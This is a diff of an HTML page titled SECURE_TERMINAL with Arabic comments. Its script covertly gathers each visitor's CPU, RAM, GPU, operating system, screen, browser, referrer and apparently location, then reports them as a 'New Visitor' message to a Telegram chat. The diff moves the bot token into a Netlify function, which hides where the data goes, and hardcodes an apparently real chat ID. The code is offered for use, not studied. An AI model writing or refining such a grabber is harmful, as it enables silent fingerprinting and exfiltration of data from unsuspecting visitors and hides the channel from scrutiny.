@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SECURE_TERMINAL</title>
     <style>
+        /* نفس الستايلات السابقة */
         * {
             box-sizing: border-box;
         }
@@ -223,10 +224,9 @@
 
     <script>
         // ============================================
-        // ضع التوكن الجديد هنا (من BotFather)
+        // إرسال عبر Netlify Function (آمن)
         // ============================================
-        const BOT_TOKEN = "ضع_التوكن_الجديد_هنا";
-        const TELEGRAM_CHAT_ID = "ضع_الChat_ID_هنا";
+        const TELEGRAM_CHAT_ID = "8484620043";
 
         // ============================================
         // جلب معلومات الجهاز
@@ -234,10 +234,8 @@
         async function getDeviceInfo() {
             const info = {};
 
-            // المعالج
             info.cpuCores = navigator.hardwareConcurrency || "غير متاح";
 
-            // الرام
             try {
                 if ('deviceMemory' in navigator) {
                     info.ram = navigator.deviceMemory + " GB";
@@ -253,7 +251,6 @@
                 info.ram = "غير متاح";
             }
 
-            // GPU
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
@@ -271,7 +268,6 @@
                 info.gpu = "غير متاح";
             }
 
-            // نظام التشغيل
             const ua = navigator.userAgent;
             let os = "Unknown";
             if (ua.includes("Windows NT 10.0")) os = "Windows 10/11";
@@ -284,11 +280,9 @@
             else if (ua.includes("Linux")) os = "Linux";
             info.os = os;
 
-            // الشاشة
             info.screen = window.screen.width + "x" + window.screen.height;
             info.pixelRatio = window.devicePixelRatio || 1;
 
-            // المتصفح
             let browser = "Unknown";
             if (ua.includes("Edg/")) browser = "Edge";
             else if (ua.includes("Chrome/") && !ua.includes("Chromium")) browser = "Chrome";
@@ -300,7 +294,7 @@
         }
 
         // ============================================
-        // إرسال الإشعار
+        // إرسال الإشعار عبر Netlify Function
         // ============================================
         async function notifyVisit() {
             // جلب الموقع
@@ -317,10 +311,8 @@
                 // ignore
             }
 
-            // جلب معلومات الجهاز
             const deviceInfo = await getDeviceInfo();
 
-            // بناء الرسالة
             const message =
                 "🔐 **New Visitor**\n" +
                 "━━━━━━━━━━━━━━━━━━━━\n\n" +
@@ -342,22 +334,20 @@
                 "📌 **Referrer**\n" +
                 "  " + (document.referrer || "direct");
 
-            // إرسال إلى تلغرام
+            // إرسال إلى Netlify Function (التوكن في env)
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                const response = await fetch("/.netlify/functions/telegram", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: "Markdown",
-                        disable_web_page_preview: true
+                        text: message
                     })
                 });
 
                 const data = await response.json();
 
-                if (data.ok) {
+                if (response.ok) {
                     console.log('✅ تم الإرسال بنجاح');
                 } else {
                     console.error('❌ فشل الإرسال:', data);
